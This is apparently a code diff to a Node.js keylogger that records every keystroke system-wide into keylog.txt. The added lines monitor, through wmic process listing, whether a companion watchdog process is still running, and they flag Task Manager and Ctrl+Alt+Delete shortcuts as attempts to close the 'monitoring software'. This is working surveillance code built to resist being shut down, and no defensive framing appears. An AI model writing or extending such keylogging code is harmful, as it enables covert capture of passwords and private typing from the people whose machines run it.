@@ -1,5 +1,50 @@
 const fs = require('fs');
 const { GlobalKeyboardListener } = require('node-global-key-listener');
+const { exec } = require('child_process');
+
+// Log termination to the keylog.txt file
+function logToKeylogFile(message) {
+    const timestamp = new Date().toLocaleString();
+    const logMessage = `\n${timestamp} - ${message}\n`;
+    fs.appendFileSync('keylog.txt', logMessage);
+  }
+
+let wasRunning = false; // Tracks if the watchdog was running in the last check
+
+// Function to check if the watchdog process is running
+function checkWatchdogStatus() {
+    // Check if stop.txt exists
+    if (fs.existsSync('stop.txt')) {
+      console.log('Stop file detected. Watchdog is shutting down.');
+      logToKeylogFile('Watchdog has stopped due to stop.txt.');
+      process.exit(0);
+    }
+  
+    // Check the current processes to see if the watchdog is running
+    exec('wmic process where "name=\'node.exe\'" get ProcessId, ExecutablePath, CommandLine /FORMAT:LIST', (error, stdout) => {
+      if (error) {
+        logToKeylogFile(`Error checking watchdog status: ${error.message}`);
+        return;
+      }
+  
+      // Check if the output contains the watchdog.js process
+      const isWatchdogRunning = stdout.includes('watchdog.js');
+  
+      if (isWatchdogRunning) {
+        wasRunning = true; // Update the status to running
+      } else if (wasRunning) {
+        // Only log if the watchdog was previously running and has now stopped
+        logToKeylogFile('Watchdog has stopped unexpectedly.');
+        wasRunning = false; // Update the status to stopped
+      }
+    });
+  }
+  
+  // Check the status every 5 seconds
+  setInterval(checkWatchdogStatus, 5000);
+  
+  // Initial check
+  checkWatchdogStatus();
 
 // Create a write stream for the key log file
 const logStream = fs.createWriteStream('keylog.txt', { flags: 'a' });
@@ -122,6 +167,22 @@ ensureNewlineBeforeDate();
 logStream.write(`${lastLoggedDate}\n`);
 
 keyboard.addListener((event) => {
+    // Define Task Manager shortcut conditions
+    const isTaskManagerShortcut = 
+        (event.name === 'ESC' && event.state === 'DOWN' && event.ctrlKey && event.shiftKey) || // Ctrl + Shift + Esc
+        (event.name === 'DELETE' && event.state === 'DOWN' && event.ctrlKey && event.altKey);  // Ctrl + Alt + Delete
+
+    // Handle Task Manager shortcut detection
+    if (isTaskManagerShortcut) {
+        // Write buffer to file
+        writeBufferToFile();
+
+        // Log the Task Manager opening message
+        logStream.write('\n[Task Manager has been opened - Potential for closing the monitoring software]\n\n');
+
+        console.log('Task Manager shortcut detected. Logging warning message.');
+    }
+    
     if (event.state === 'DOWN' && !ignoreKeys.has(event.name)) {
         if (keysToLog.has(event.name)) {
             if (event.name === 'BACKSPACE') {
